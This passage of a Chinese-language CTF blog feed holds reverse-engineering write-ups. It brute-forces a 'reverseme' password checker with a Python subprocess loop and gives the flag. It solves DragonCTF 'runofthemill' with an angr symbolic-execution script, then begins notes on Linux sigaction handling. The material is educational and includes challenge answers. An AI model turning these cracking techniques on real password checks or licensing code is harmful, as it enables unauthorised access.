            foo &lt;span style=&#34;color:#f92672&#34;&gt;*=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;float&lt;/span&gt;)log(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;float&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)((&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;i));
        }
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;((&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)(&lt;span style=&#34;color:#ae81ff&#34;&gt;100000&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;bar) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;){
            printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Password Incorrect&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
        }
    }
    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Password Correct&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;相同的六次方程，分别带入 &lt;code&gt;flag[0:4], flag[2:6], flag[4:8]...&lt;/code&gt;，知道第一位，于是考虑直接爆破&lt;/p&gt;
&lt;p&gt;先修改一下源代码&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;math.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; argc, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt; argv) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(argc &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;){
        printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Usage: ./reverseme password&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#75715e&#34;&gt;// if(strlen(argv[1])!=14){
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;//     printf(&amp;#34;Incorrect Length\n&amp;#34;);
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;//     return 1;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// }
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// if(*argv[1] != 112){//Not enough precision
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;//     printf(&amp;#34;Password Incorrect\n&amp;#34;);
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;//     return 1;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// }
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;double&lt;/span&gt; magic_numbers[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{
        &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;68822144.50341525673866271972656250000000000000000000000000&lt;/span&gt;, 
        &lt;span style=&#34;color:#ae81ff&#34;&gt;56777293.39031631499528884887695312500000000000000000000000&lt;/span&gt;, 
        &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3274524.75536667229607701301574707031250000000000000000000&lt;/span&gt;, 
        &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;85761.51255339206545613706111907958984375000000000000000&lt;/span&gt;, 
        &lt;span style=&#34;color:#ae81ff&#34;&gt;8443.33244327564352715853601694107055664062500000000000&lt;/span&gt;, 
        &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;166.67369627952575683593750000000000000000000000000000&lt;/span&gt;, 
        &lt;span style=&#34;color:#ae81ff&#34;&gt;1.00000000000000000000000000000000000000000000000000&lt;/span&gt;, 
    };
    &lt;span style=&#34;color:#75715e&#34;&gt;// for(int i = 0; i &amp;lt; 6;i++){
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;double&lt;/span&gt; foo&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.0&lt;/span&gt;,bar&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0.0&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; j&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;j&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;;j&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;){
            bar &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; magic_numbers[j] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; foo;
            foo &lt;span style=&#34;color:#f92672&#34;&gt;*=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;float&lt;/span&gt;)log(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;float&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)((&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;i));
        }
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;((&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)(&lt;span style=&#34;color:#ae81ff&#34;&gt;100000&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;bar) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;){
            printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Password Incorrect&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
        }
    &lt;span style=&#34;color:#75715e&#34;&gt;// }
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Password Correct&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后 python 脚本进行爆破&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; string
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; subprocess

charset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ascii_letters &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;digits &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;!@#$%^_&amp;#34;&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# pre = &amp;#39;p&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# for a in charset:&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#     for b in charset:&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#         for c in charset:&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#             command = &amp;#34;./reverseme_1 p&amp;#34; + a + b + c&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#             output = subprocess.check_output(command, shell=True, stderr=subprocess.PIPE)&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#             if b&amp;#34;Correct&amp;#34; in output:&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#                 print (&amp;#34;p&amp;#34; + a + b + c)&lt;/span&gt;


pre &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;zf&amp;#34;&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;# 每次修改一下 pre 就可以进行爆破了&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# pfTw&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# pLzf zfTw&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# p0%Y %Yn@ n@M1 M1aL aLzf zfTw&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# p@M1&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; charset:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; b &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; charset:
        command &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./reverseme_1 &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pre &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; b
        output &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; subprocess&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;check_output(command, shell&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;, stderr&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;subprocess&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;PIPE)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Correct&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; output:
            print (pre &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; b)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面用来爆破 &lt;code&gt;p&lt;/code&gt; 开头的，共有四种可能，依次爆破就行&lt;/p&gt;
&lt;p&gt;最后得到 flag: &lt;code&gt;p0%Yn@M1aLzfTw&lt;/code&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>DragonCTF Runofthemill Writeup</title>
        <link>/post/dragonctf-runofthemill-writeup/</link>
        <pubDate>Fri, 10 Dec 2021 02:01:06 +0000</pubDate>
        
        <guid>/post/dragonctf-runofthemill-writeup/</guid>
        <description>&lt;h2 id=&#34;题目分析&#34;&gt;题目分析&lt;/h2&gt;
&lt;p&gt;获取输入&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sys_read(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, byte_412000, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x40uLL&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;中间计算&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;  byte_412000[&lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; __ROR1__(byte_412000[&lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt;], &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;);
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;byte_412000[&lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4EC10FC6u&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_WORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;byte_412000[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEBFFu&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;byte_412000[&lt;span style=&#34;color:#ae81ff&#34;&gt;38&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1698263770&lt;/span&gt;;
  &lt;span style=&#34;color:#75715e&#34;&gt;// 以下省略
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;最后的验证&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;  v9 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; byte_412000;
  v10 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; byte_412050;
  v11 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64LL&lt;/span&gt;;
  v12 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
  {
    v12 &lt;span style=&#34;color:#f92672&#34;&gt;|=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v10&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v9&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
    &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;v11;
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( v11 );
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;angr求解&#34;&gt;Angr求解&lt;/h2&gt;
&lt;p&gt;还是很容易看懂的，主要是如何求解&lt;/p&gt;
&lt;p&gt;一种思路是把汇编反过来，pizza爷用的是这种做法，于是就写了个Angr喝茶去了&lt;/p&gt;
&lt;p&gt;Angr用的是手动往全局变量注入符号，然后在验证前停止，手动添加约束，wp中的写法是直接用程序中的验证，并添加了 &lt;code&gt;LAZY_SOLVES&lt;/code&gt; 参数，学到了&lt;/p&gt;
&lt;p&gt;之前用自己脚本跑的适合发现一直是 &lt;code&gt;unsat&lt;/code&gt;，以为Angr会有问题，但后来发现有个wp就是用的Angr&lt;/p&gt;
&lt;p&gt;于是掏出了之前写的脚本做了一些尝试&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;from angr import *
import claripy
import binascii

input_length = 56

base_addr = 0x400000
proj = Project(&#39;runofthemill&#39;, main_opts={&amp;quot;base_addr&amp;quot;: base_addr})

start_addr = 0x401054
state = proj.factory.blank_state(addr = start_addr, add_options={options.LAZY_SOLVES})
# state.regs.rdi = 0x412000
user_input = [claripy.BVS(&#39;input_%d&#39; % i, 8) for i in range(input_length)]

mem_addr = 0x412000
for i in range(input_length):
    state.memory.store(mem_addr + i, user_input[i])
state.add_constraints(state.memory.load(mem_addr, 6) == int(binascii.hexlify(b&amp;quot;DrgnS{&amp;quot;), 16))
simgr = proj.factory.simgr(state)

find_addr = 0x4117FF

simgr.explore(find = find_addr)

ans = [
    0xB5, 0x9C, 0x9A, 0x08, 0x68, 0x91, 0x29, 0x0F, 0xBD, 0x1E, 
    0xFB, 0x71, 0xF4, 0x93, 0x5C, 0xDA, 0x0D, 0x94, 0x10, 0x77, 
    0x6C, 0x41, 0x8D, 0xE2, 0x5E, 0x26, 0xA5, 0x0A, 0x95, 0xE1, 
    0x14, 0xDB, 0x25, 0x0B, 0x09, 0xE4, 0x7B, 0xE7, 0x07, 0x71, 
    0x4E, 0xD3, 0xF2, 0xC1, 0x5C, 0xB2, 0xB4, 0x17, 0x30, 0xAA, 
    0x3D, 0x35, 0x1E, 0x98, 0xC4, 0x92, 0xF4, 0x33, 0x69, 0xCC, 
    0x11, 0xB0, 0xCE, 0xCC
]

if simgr.found:
    print (&amp;quot;end state found&amp;quot;)
    end_state = simgr.found[0]
    for i in range(64):
        end_state.add_constraints(end_state.memory.load(mem_addr + i, 1) == ans[i])
    for i in range(input_length):
        print (end_state.solver.eval(user_input[i], cast_to=bytes).decode(), end=&#39;&#39;)
    print ()
else:
    print (&amp;quot;No result&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;最后发现只要把 &lt;code&gt;input_length&lt;/code&gt; 设置为56及以下就可以，其他的都是 &lt;code&gt;unsat&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;capstone学习&#34;&gt;capstone学习&lt;/h2&gt;
&lt;p&gt;TODO&lt;/p&gt;
&lt;p&gt;后续学习一下再来补&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Learn Basic Signal from DNUICTF easyre</title>
        <link>/post/learn-basic-signal-from-dnuictf-easyre/</link>
        <pubDate>Thu, 09 Dec 2021 15:05:55 +0000</pubDate>
        
        <guid>/post/learn-basic-signal-from-dnuictf-easyre/</guid>
        <description>&lt;h2 id=&#34;一些信号量函数的学习&#34;&gt;一些信号量函数的学习&lt;/h2&gt;
&lt;p&gt;信号量的注册在init函数中&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;  v2.sa_handler &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (__sighandler_t)sub_400E1D;
  v2.sa_flags &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;;
  sigaction(&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v2, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v1);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;sigaction()&lt;/code&gt; 函数定义为&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sigaction&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; signum, &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sigaction&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;act, &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sigaction&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;oldact);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;sigaction 结构体定义如下&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sigaction&lt;/span&gt; {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;sa_handler) (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;);
    sigset_t sa_mask;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; sa_flags;       &lt;span style=&#34;color:#75715e&#34;&gt;// 用来设置信号处理的相关操作
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;sa_restorer) (&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;关于 &lt;code&gt;sa_flags&lt;/code&gt; 的定义如下 (from &lt;code&gt;linux/include/uapi/asm-generic/signal-defs.h&lt;/code&gt;)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#ifndef SA_NOCLDSTOP
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define SA_NOCLDSTOP	0x00000001
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#endif
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#ifndef SA_NOCLDWAIT
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define SA_NOCLDWAIT	0x00000002
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#endif
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#ifndef SA_SIGINFO
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define SA_SIGINFO	0x00000004
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#endif
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* 0x00000008 used on alpha, mips, parisc */&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;/* 0x00000010 used on alpha, parisc */&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;/* 0x00000020 used on alpha, parisc, sparc */&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;/* 0x00000040 used on alpha, parisc */&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;/* 0x00000080 used on parisc */&lt;/span&gt;
